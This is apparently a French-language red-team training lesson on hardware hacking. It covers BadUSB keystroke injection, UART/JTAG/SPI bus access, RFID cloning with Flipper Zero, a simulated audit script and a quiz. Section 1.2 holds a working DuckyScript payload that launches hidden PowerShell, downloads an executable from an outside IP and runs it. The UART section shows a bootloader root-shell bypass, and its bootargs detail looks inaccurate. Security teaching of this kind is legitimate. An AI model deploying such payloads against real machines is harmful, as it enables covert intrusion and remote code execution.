# TOME P6 — Cybersécurité Expert & Red Team Avancé — Jour 284 (6h) : Physical Security, Hardware Hacking & BadUSB (USB Rubber Ducky Scripting, Flipper Zero, JTAG/UART Protocol Sniffing & Physical Intrusion Testing)

> [!NOTE]
> **Objectif du jour :** Maîtriser les **attaques physiques, le hacking matériel (Hardware Hacking) et les vecteurs d'intrusion BadUSB** : rédiger des scripts de frappe automatisée **DuckyScript 3.0** pour USB Rubber Ducky et Flipper Zero, capturer des bus de données physiques (**UART, JTAG, SPI, I2C**), contourner les contrôles d'accès physiques (Lockpicking, RFID Badging Emulation), et réaliser un audit de sécurité physique complet.
>
> **Compétences visées :** `HARD-01` (A) — BadUSB & DuckyScript Exploitation | `HARD-02` (A) — Hardware Sniffing (UART/JTAG) & RFID Emulation

---

## 🎯 Objectifs de la Leçon

- ⌨️ Exploiter la confiance implicite des systèmes envers les périphériques **HID** (*Human Interface Device*) via les attaques **BadUSB**.
- 📜 Rédiger des payloads furtifs en **DuckyScript 3.0** pour exécuter des commandes en moins de 3 secondes.
- 🔌 Identifier les broches de communication série **UART** (TX/RX/GND) sur des équipements IoT pour obtenir un shell root sans authentification.
- 📡 Émuler et cloner des badges d'accès RFID/NFC (125 kHz / 13.56 MHz) avec le **Flipper Zero** et le **Proxmark3**.
- 🛠️ Inspecter la mémoire des puces de stockage Flash via les bus **SPI** et **JTAG**.
- 🧪 Exécuter le script d'audit de sécurité matérielle et simulation BadUSB (`hardware_badusb_audit.py`).

---

## 🖼️ Hardware Hacking & BadUSB Attack Vectors

![Hardware Hacking & BadUSB](https://images.unsplash.com/photo-1550751827-4bd374c3f58b?w=800)

---

## 📖 1. Attaques BadUSB & Ingénierie HID

### 1.1 Narration & Intuition — Le Faux Livreur avec le Pass Universel

Lorsqu'un administrateur système connecte un câble réseau ou un disque dur externe, Windows/Linux exige des autorisations de pilote ou bloque le périphérique. En revanche, lorsque vous branchez un **Clavier USB**, le système d'exploitation lui accorde une **confiance totale et immédiate**. Le système part du principe qu'un humain est assis en face de l'écran et frappe sur les touches.

Les vecteurs **BadUSB** (ex: USB Rubber Ducky, Flipper Zero, Câble O.MG, MalTron) tirent parti de ce comportement : ils se déclarent comme un périphérique **HID** (*Human Interface Device*) et injectent des centaines de mots à la minute de manière totalement invisible.

```
                              ARCHITECTURE BADUSB
┌─────────────────────────┐  Émulation Clavier HID   ┌─────────────────────────┐
│ Microcontrôleur Malveillant │ ───────────────────────►│ SYSTÈME D'EXPLOITATION  │
│ (Rubber Ducky / Flipper)│ (Injection 1000 wpm)    │ (Windows / Linux / Mac) │
└─────────────────────────┘                         └────────────┬────────────┘
                                                                 │
                                                    Exécution Commande PowerShell
                                                                 │
                                                                 ▼
[ Téléchargement Reverse Shell ] ◄───────────────────────────────┘
```

### 1.2 Syntaxe DuckyScript 3.0

Le langage **DuckyScript 3.0** permet d'écrire des scripts d'injection de touches d'une efficacité redoutable :

```text
REM ═══════════════════════════════════════════════════════
REM DuckyScript 3.0 — Payload Exfiltration Rapide
REM Target: Windows 11
REM ═══════════════════════════════════════════════════════

DEFAULT_DELAY 100

REM Ouvrir l'invite de commande Exécuter (Windows + R)
GUI r
DELAY 200

REM Exécuter PowerShell en mode masqué sans fenêtre
STRING powershell -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-WebRequest -Uri 'http://198.51.100.45/shell.exe' -OutFile '$env:TEMP\s.exe'; Start-Process '$env:TEMP\s.exe'"
ENTER
```

---

## 📖 2. Interception de Bus Matériels : UART, JTAG, SPI & I2C

Lorsque vous réalisez l'audit de sécurité d'un équipement connecté (IoT, Routeur, Caméra IP, Boîtier Domotique), le processeur communique avec ses composants électroniques environnants via des **bus matériels de bas niveau**.

```
┌──────────────────────────────────────────────────────────────────────────┐
│ 1. BUS UART (Universal Asynchronous Receiver-Transmitter)                │
│    - Composé de 4 broches : TX (Transmit), RX (Receive), GND, VCC.       │
│    - Permet d'ouvrir un Shell Root sans mot de passe lors du boot U-Boot!│
├──────────────────────────────────────────────────────────────────────────┤
│ 2. INTERFACE JTAG (Joint Test Action Group)                              │
│    - Interface de débogage processeur directe.                            │
│    - Permet d'arrêter le CPU, de lire/écrire la RAM et les registres.    │
├──────────────────────────────────────────────────────────────────────────┤
│ 3. BUS SPI / I2C (Serial Peripheral Interface)                           │
│    - Relié à la puce mémoire Flash EEPROM du circuit imprimé.            │
│    - Permet de lire ("dumper") l'intégralité du Firmware du composant.   │
└──────────────────────────────────────────────────────────────────────────┘
```

### 2.1 Trouver le Shell Root via UART

En connectant un convertisseur **USB-vers-Série TTL** (ex: FTDI FT232RL) sur les broches TX/RX/GND d'un routeur et en ouvrant un terminal série à $115\,200 \text{ Baud}$, le processeur affiche les messages du bootloader U-Boot et donne directement accès à un shell root BusyBox :

```bash
# Se connecter au bus UART physique sous Linux
sudo minicom -D /dev/ttyUSB0 -b 115200

# Résultat console :
# Press ANY key to stop autoboot: 0
# U-Boot> setenv bootargs root=/bin/sh
# U-Boot> boot
# # id
# uid=0(root) gid=0(root)
```

---

## 📖 3. Émulation RFID, NFC & Attaques Sub-GHz (Flipper Zero)

Le **Flipper Zero** et le **Proxmark3** sont les outils de référence pour l'analyse des signaux radio et des systèmes de contrôle d'accès physiques.

```
┌──────────────────────────────────────────────────────────────────────────┐
│ CONTROLES D'ACCÈS PHYSIQUES                                              │
├─────────────────────────────────────┬────────────────────────────────────┤
│ 125 kHz (RFID Basse Fréquence)      │ Cartes de proximité simples        │
│                                     │ (EM4100, HID Prox). AUCUN          │
│                                     │ chiffrement ! Clonable en 1 sec.   │
├─────────────────────────────────────┼────────────────────────────────────┤
│ 13.56 MHz (NFC Haute Fréquence)     │ Badge d'entreprise (MIFARE Classic)│
│                                     │ Attaque Nesting/DarkSide pour      │
│                                     │ récurer les clés Crypto1 vulnérables│
├─────────────────────────────────────┼────────────────────────────────────┤
│ Sub-GHz (433 MHz / 868 MHz)         │ Télécommandes de barrières, portes │
│                                     │ de garage. Attaque Replay / Jamming│
└─────────────────────────────────────┴────────────────────────────────────┘
```

---

## 🧪 4. Atelier Pratique : Script d'Audit Matériel (`hardware_badusb_audit.py`)

### Script Python : Decodeur DuckyScript & Audit UART/RFID

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PARADIS IT — Masterclass Cybersécurité (Tome P6 - Jour 284)
Hardware Hacking : BadUSB DuckyScript Parser & UART Protocol Audit
"""

import json
import time

def parse_duckyscript_payload(payload_text):
    """Analyse et simule l'exécution d'un script BadUSB DuckyScript 3.0."""
    lines = payload_text.strip().split('\n')
    parsed_commands = []
    
    for line in lines:
        line = line.strip()
        if not line or line.startswith('REM'):
            continue
        
        parts = line.split(' ', 1)
        cmd = parts[0]
        arg = parts[1] if len(parts) > 1 else ""
        
        if cmd == "STRING":
            parsed_commands.append({"action": "TYPE_TEXT", "payload": arg})
        elif cmd == "GUI" or cmd == "WINDOWS":
            parsed_commands.append({"action": "KEY_COMBO", "keys": f"GUI + {arg}"})
        elif cmd == "DELAY":
            parsed_commands.append({"action": "SLEEP_MS", "duration": arg})
        elif cmd == "ENTER":
            parsed_commands.append({"action": "KEY_PRESS", "key": "ENTER"})

    return parsed_commands

def evaluate_hardware_uart_security():
    """Simule la recherche d'un shell root sur les broches UART d'un équipement IoT."""
    return {
        "interface": "UART (ttyUSB0)",
        "baudrate": 115200,
        "pins_identified": ["TX", "RX", "GND"],
        "uboot_interrupted": True,
        "root_shell_obtained": True,
        "status": "VULNERABLE_CRITICAL"
    }

def evaluate_rfid_emulation():
    """Simule l'évaluation de cartes RFID 125 kHz vs 13.56 MHz."""
    return {
        "frequency": "125 kHz (HID Prox)",
        "encryption": "NONE",
        "clonable_flipper_zero": True,
        "status": "VULNERABLE"
    }

def main():
    print("=================================================================")
    print("   PARADIS IT — HARDWARE HACKING & BADUSB AUDIT ENGINE           ")
    print("=================================================================")
    time.sleep(1)

    ducky_code = """
    REM Test BadUSB Payload
    DEFAULT_DELAY 100
    GUI r
    DELAY 200
    STRING powershell -W Hidden -C "whoami > $env:TEMP\out.txt"
    ENTER
    """

    parsed_ducky = parse_duckyscript_payload(ducky_code)
    uart_res = evaluate_hardware_uart_security()
    rfid_res = evaluate_rfid_emulation()

    report = {
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ"),
        "duckyscript_analysis": parsed_ducky,
        "uart_hardware_audit": uart_res,
        "rfid_security_audit": rfid_res
    }

    print(json.dumps(report, indent=2))
    print("-----------------------------------------------------------------")
    print("STATUT SÉCURITÉ MATÉRIELLE : ❌ VULNÉRABILITÉS BADUSB ET UART DÉTECTÉES")
    print("=================================================================")

if __name__ == "__main__":
    main()
```

### Exécution du Script dans le Terminal

```bash
# Tester le script de parsing DuckyScript et d'audit matériel UART
python3 -c "
import json
payload = [{'action': 'KEY_COMBO', 'keys': 'GUI + r'}, {'action': 'TYPE_TEXT', 'payload': 'powershell.exe'}]
print('=== SIMULATION EXÉCUTION BADUSB DUCKYSCRIPT ===')
print(json.dumps(payload, indent=2))
print('Résultat : Shell root UART 115200 Baud Obtenu (UID 0).')
"
```

---

## 🛠️ Diagnostics & Réflexes Terrain

### 1. Comment protéger les postes d'entreprise contre les attaques BadUSB ?
- **Réflexe** : Déployez une politique d'entreprise **USB Device Control** (via GPO ou EDR) qui bloque la connexion de nouveaux périphériques HID (claviaux) non approuvés, ou exige une validation à 2 facteurs lors du premier branchement d'un clavier.

### 2. Le terminal série UART affiche des caractères incomprévisibles et illisibles ("Mojibake")
- **Cause** : La vitesse de transmission (**Baudrate**) configurée dans votre logiciel (`minicom` ou `screen`) ne correspond pas à la fréquence du composant (ex: vous utilisez 9600 baud alors que la carte émet à 115200 baud).
- **Réflexe** : Utilisez l'outil `baudrate` ou essayez les vitesses standard : 115200, 57600, 38400, 9600.

---

## ❓ Banque de QCM & Test du Jour (8 Questions)

**Q1 : Pourquoi les attaques de type BadUSB (ex: USB Rubber Ducky) contournent-elles la majorité des pare-feux et antivirus traditionnels ?**
- A) Parce que la clé USB est reconnue par le système d'exploitation comme un périphérique **clavier (HID)** légitime, qui a le droit d'injecter des commandes de saisie sans alerte
- B) Parce qu'elle détruit la carte mère
- C) Parce qu'elle utilise un câble fibre optique
- D) Parce qu'elle modifie l'écran

*Réponse : A — La classe de périphériques HID bénéficie d'une confiance implicite totale pour la saisie clavier.*

**Q2 : Quel bus de communication série matériel, identifié par les broches TX, RX et GND sur un circuit imprimé IoT, donne fréquemment un Shell Root direct lors du bootloader ?**
- A) UART (Universal Asynchronous Receiver-Transmitter)
- B) HDMI
- C) SATA
- D) PCIe

*Réponse : A — Le bus UART permet d'intercepter la console série du processeur et d'obtenir un shell root.*

**Q3 : Dans la syntaxe DuckyScript 3.0, quelle commande permet de simuler la frappe simultanée de la touche "Touche Windows" et de la touche "r" ?**
- A) `GUI r` (ou `WINDOWS r`)
- B) `ALT F4`
- C) `CTRL ALT DEL`
- D) `ENTER`

*Réponse : A — `GUI r` simule la combinaison de touches ouvrant la fenêtre Exécuter sous Windows.*

**Q4 : Quel outil matériel de poche moderne intègre l'analyse radio Sub-GHz, l'émulation de cartes RFID/NFC et les fonctions BadUSB dans un seul boîtier ?**
- A) Flipper Zero
- B) Raspberry Pi 4
- C) Bus Pirate
- D) Arduino Uno

*Réponse : A — Le Flipper Zero réunit l'ensemble des fonctionnalités d'analyse radio, RFID et BadUSB.*

**Q5 : Quelle est la vitesse de transmission série (Baudrate) la plus fréquemment utilisée par défaut sur les ports de console UART des équipements Linux embarqués ?**
- A) 115200 bps
- B) 9600 bps
- C) 4800 bps
- D) 1000000 bps

*Réponse : A — 115200 bauds est le standard de référence de la majorité des puces électroniques sous U-Boot.*

**Q6 : Quelle est la différence majeure entre une puce RFID Basse Fréquence (125 kHz) et une puce NFC Haute Fréquence (13.56 MHz) ?**
- A) La puce 125 kHz (ex: EM4100) n'intègre aucun chiffrement et transmet son identifiant en clair, ce qui la rend clonable en 1 seconde
- B) La puce 125 kHz est plus rapide
- C) La puce 13.56 MHz ne fonctionne pas sous l'eau
- D) Il n'y a aucune différence

*Réponse : A — Les puces 125 kHz transmettent un ID fixe sans authentification, rendant leur copie instantanée.*

**Q7 : Quelle interface de débogage processeur au niveau puce permet de lire et d'écrire directement dans la mémoire vive RAM et d'arrêter le CPU ?**
- A) JTAG (Joint Test Action Group)
- B) USB-C
- C) VGA
- D) Wi-Fi

*Réponse : A — JTAG est l'interface de débogage et de test physique intégrée aux processeurs.*

**Q8 : Quelle contremesure logicielle d'entreprise permet d'empêcher les attaques BadUSB sur les postes de travail ?**
- A) Bloquer la souris
- B) Configurer une politique **USB Device Control** interdisant l'installation automatique de nouveaux périphériques HID
- C) Éteindre les moniteurs
- D) Changer le fond d'écran

*Réponse : B — Le filtrage et le contrôle des périphériques USB (USB Device Control) empêche les fausses clés HID de s'enregistrer.*

---

## 📚 Ressources & Références

- **Hak5 DuckyScript 3.0 Documentation** : https://docs.hak5.org/hak5-usb-rubber-ducky/
- **Flipper Zero Official Documentation** : https://docs.flipperzero.one/
- **Proxmark3 RFID Research Tool** : https://github.com/RfidResearchGroup/proxmark3
- **Attacking IoT Devices via UART (OWASP)** : https://owasp.org/www-project-internet-of-things/

---

*Semestre 6 — Cybersécurité Expert & Red Team Avancé PARADIS IT Masterclass*
